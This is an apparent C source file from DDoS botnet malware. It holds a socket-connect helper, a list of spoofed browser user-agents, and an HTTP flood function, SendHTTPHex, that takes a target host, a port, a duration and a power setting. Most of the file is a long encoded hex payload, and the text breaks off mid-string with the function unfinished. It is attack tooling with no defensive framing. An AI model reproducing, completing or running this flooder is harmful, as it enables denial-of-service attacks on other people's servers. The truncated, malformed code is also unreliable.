#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>

const char *useragents[] = {
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
};

int socket_connect(char *host, in_port_t port) 
{
	struct hostent *hp;
	struct sockaddr_in addr;
	int on = 1, sock;     
	if ((hp = gethostbyname(host)) == NULL) return 0;
	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
	if (sock == -1) return 0;
	if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
	return sock;
}      

void SendHTTPHex(char *method, char *host, int port, int timeEnd, int power) {
	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char request[512], buffer[1], hex_payload[2048];
	sprintf(hex_payload, "\x62\x61\x6D\x7D\x68\x7B\x06\x8F\x67\x7F\x14\x1E\x1F\x1E\x1C\x1C\x1C\x1C\x18\x15\x15\x15\x1E\x15\x18\x15\x15\x48\x47\x46\x5A\x44\x46\x48\x43\x5A\x47\x5F\x5B\x46\x4F\x48\x5B\x5A\x4E\x4F\x5B\x5A\x4D\x5B\x5A\x5B\x5A\x5B\x4D\x6C\x6C\x6C\x6C\x6C\x42\x49\x49\x58\x5E\x59\x42\x5F\x55\x43\x59\x54\x48\x48\x48\x48\x48\x2C",      
       "\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x42\x49\x49\x58\x5E\x59\x42\x5F\x59\x74\x68\x2C"
       "\x5F\x58\x5E\x45\x42\x4B\x4D\x5E\x49\x4B\x4D\x55\x42\x45\x4B\x4B\x4D\x00\x5F\x4D\x48\x44\x43\x59\x5E\x5F\x55\x49\x49\x58\x55\x43\x59\x58\x5E\x4D\x42\x4F\x47\x55\x5F\x4F\x59\x42\x58\x6C\x5F\x5C\x43\x43\x4A\x45\x42\x4B\x4D\x58\x58\x4D\x4F\x47\x5F\x02\x2C"
       "\x7A\x15\x5D\x1E\x7A\x15\x6D\x1D\x7B\x1B\x49\x1E\x03\x79\x41\x78\x03\x72\x1F\x61\x48\x13\x43\x58\x49\x67\x42\x0F\x01\x74\x5F\x43\x44\x43\x6E\x1E\x72\x1D\x58\x42\x6D\x1E\x1F\x1E\x75\x03\x67\x78\x45\x55\x7A\x15\x5D\x1E\x7A\x15\x6D\x1D\x7B\x1B\x49\x1E\x03\x79\x41\x78\x03\x72\x1F\x61\x48\x13\x43\x58\x49\x67\x42\x0F\x01\x74\x5F\x43\x44\x43\x6E\x1E\x72\x1D\x58\x42\x6D\x1E\x1F\x1E\x75\x03\x67\x78\x45\x55\x7A\x15\x5D\x1E\x7A\x15\x6D\x1D\x7B\x1B\x49\x1E\x03\x79\x41\x78\x03\x72\x1F\x61\x48\x13\x43\x58\x49\x67\x42\x0F\x01\x74\x5F\x43\x44\x43\x6E\x1E\x72\x1D\x58\x42\x6D\x1E\x1F\x1E\x75\x03\x67\x78\x45\x55\x7A\x15\x5D\x1E\x7A\x15\x6D\x1D\x7B\x1B\x49\x1E\x03\x79\x41\x78\x03\x72\x1F\x61\x48\x13\x43\x58\x49\x67\x42\x0F\x01\x74\x5F\x43\x44\x43\x6E\x1E\x72\x1D\x58\x42\x6D\x1E\x1F\x1E\x75\x03\x67\x78\x45\x55\x7A\x15\x5D\x1E\x7A\x15\x6D\x1D\x7B\x1B\x49\x1E\x03\x79\x41\x78\x03\x72\x1F\x61\x48\x13\x43\x58\x49\x67\x42\x0F\x01\x74\x5F\x43\x44\x43\x6E\x1E\x72\x1D\x58\x42\x6D\x1E\x1F\x1E\x75\x03\x67\x78\x45\x55\x7A\x15\x5D\x1E\x7A\x15\x6D\x1D\x7B\x1B\x49\x1E\x03\x79\x41\x78\x03\x72\x1F\x61\x48\x13\x43\x58\x49\x67\x42\x0F\x01\x74\x5F\x43\x44\x43\x6E\x1E\x72\x1D\x58\x42\x6D\x1E\x1F\x1E\x75\x03\x67\x78\x45\x55\x7A\x15\x5D\x1E\x7A\x15\x6D\x1D\x7B\x1B\x49\x1E\x03\x79\x41\x78\x03\x72\x1F\x61\x48\x13\x43\x58\x49\x67\x42\x0F\x01\x74\x5F\x43\x44\x43\x6E\x1E\x72\x1D\x58\x42\x6D\x1E\x1F\x1E\x75\x03\x67\x78\x45\x55\x7A\x15\x5D\x1E\x7A\x15\x6D\x1D\x7B\x1B\x49\x1E\x03\x79\x41\x78\x03\x72\x1F\x61\x48\x13\x43\x58\x49\x67\x42\x0F\x01\x74\x5F\x43\x44\x43\x6E\x1E\x72\x1D\x58\x42\x6D\x1E\x1F\x1E\x75\x03\x67\x78\x45\x55\x7A\x15\x5D\x1E\x7A\x15\x6D\x1D\x7B\x1B\x49\x1E\x03\x79\x41\x78\x03\x72\x1F\x61\x48\x13\x43\x58\x49\x67\x42\x0F\x01\x74\x5F\x43\x44\x43\x6E\x1E\x72\x1D\x58\x42\x6D\x1E\x1F\x1E\x75\x03\x67\x78\x45\x55\x2C" 
       "\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x6A\x79\x6F\x67\x64\x75\x68\x7E\x6D\x2C"
       "\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x74\x6A\x79\x6F\x67\x63\x7A\x64\x74\x6A\x79\x6F\x67\x63\x7A\x64\x74\x6A\x79\x6F\x67\x63\x7A\x64\x74\x6A\x79\x6F\x67\x63\x7A\x64\x74\x6A\x79\x6F\x67\x63\x7A\x64\x74\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x74\x6A\x79\x6F\x67\x63\x7A\x64\x6D\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x6A\x79\x6F\x67\x63\x7A\x64\x7B\x7A\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x7A\x6A\x79\x6F\x67\x63\x7A\x64\x7E\x6E\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6E\x7A\x69\x6A\x79\x6F\x67\x63\x7A\x64\x6E\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x6E\x6A\x79\x6F\x67\x63\x7A\x64\x7B\x6A\x79\x6F\x67\x63\x7A\x64\x7A\x6A\x79\x6F\x67\x63\x7A\x64\x7B\x6D\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x7B\x7A\x6A\x79\x6F\x67\x63\x7A\x64\x7A\x6A\x79\x6F\x67\x63\x7A\x64\x7B\x7A\x6E\x7B\x6A\x79\x6F\x67\x63\x7A\x64\x7A\x7A\x6A\x79\x6F\x67\x63\x7A\x64\x7A\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x6A\x79\x6F\x67\x63\x7A\x64\x2C"
       "\x4A\x59\x4F\x47\x42\x4A\x43\x54\x6D\x6F\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x74\x74\x6D\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x74\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x7F\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x7E\x69\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x7E\x6A\x79\x6F\x67\x62\x6A\x63\x7A\x7A\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x7F\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x7A\x6A\x79\x6F\x67\x62\x6A\x63\x7F\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x69\x6A\x79\x6F\x67\x62\x6A\x63\x69\x6A\x79\x6F\x67\x62\x6A\x63\x6B\x6A\x79\x6F\x67\x62\x6A\x63\x7A\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x69\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x7A\x6F\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x69\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x7A\x6A\x79\x6F\x67\x62\x6A\x63\x7A\x69\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x69\x6A\x79\x6F\x67\x62\x6A\x63\x7A\x6A\x79\x6F\x67\x62\x6A\x63\x69\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x1A\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x7A\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x69\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6D\x6A\x79\x6F\x67\x62\x6A\x63\x2C"
       "\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1E\x1E\x1F\x1F\x1B\x74\x62\x69\x69\x78\x64\x6D\x74\x1D\x1F\x1F\x1B\x74\x1D\x1D\x1D\x1D\x1D\x2C"
       "\x4A\x59\x4F\x47\x42\x4A\x43\x54\x6D\x6F\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x74\x74\x6D\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x74\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x7F\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x7E\x69\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x7E\x6A\x79\x6F\x67\x62\x6A\x63\x7A\x7A\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x7F\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x7A\x6A\x79\x6F\x67\x62\x6A\x63\x7F\x6A\x79\x4A\x59\x4F\x47\x43\x5A\x44\x5F\x4A\x59\x4F\x47\x43\x5A\x44\x5F\x4A\x59\x4F\x47\x43\x5A\x44\x5F\x4A\x59\x4F\x47\x43\x5A\x44\x5F\x4A\x59\x4F\x47\x43\x5A\x44\x5F\x4A\x59\x4F\x47\x43\x5A\x44\x5F\x4A\x59\x4F\x47\x43\x5A\x44\x5F\x4A\x59\x4F\x47\x43\x5A\x44\x5F\x4A\x59\x4F\x47\x43\x5A\x44\x5F\x4A\x59\x4F\x47\x43\x5A\x44\x5F\x4A\x59\x4F\x47\x43\x5A\x44\x5F\x4A\x59\x4F\x47\x43\x5A\x44\x5F\x6C\x5F\x5C\x43\x43\x4A\x45\x42\x4B\x4D\x58\x58\x4D\x4F\x47\x5F\x5F\x5C\x43\x43\x4A\x45\x42\x4B\x4D\x58\x58\x4D\x4F\x47\x5F\x5F\x5C\x43\x43\x4A\x45\x42\x4B\x4D\x58\x58\x4D\x4F\x47\x5F\x5F\x5C\x43\x43\x4A\x45\x42\x4B\x4D\x58\x58\x4D\x4F\x47\x5F\x5F\x5C\x43\x43\x4A\x45\x42\x4B\x4D\x58\x58\x4D\x4F\x47\x5F\x5F\x5C\x43\x43\x4A\x45\x42\x4B\x4D\x58\x58\x4D\x4F\x47\x5F\x5F\x5C\x43\x43\x4A\x45\x42\x4B\x4D\x58\x58\x4D\x4F\x47\x5F\x5F\x5C\x43\x43\x4A\x45\x42\x4B\x4D\x58\x58\x4D\x4F\x47\x5F\x5F\x5C\x43\x43\x4A\x45\x42\x4B\x4D\x58\x58\x4D\x4F\x47\x5F\x5F\x5C\x43\x43\x4A\x45\x42\x4B\x4D\x58\x58\x4D\x4F\x47\x5F\x5F\x5C\x43\x43\x4A\x45\x42\x4B\x4D\x58\x58\x4D\x4F\x47\x5F\x2C"
       "\x4A\x59\x4F\x47\x42\x4A\x43\x54\x6D\x6F\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\x62\x6A\x63\x6A\x79\x6F\x67\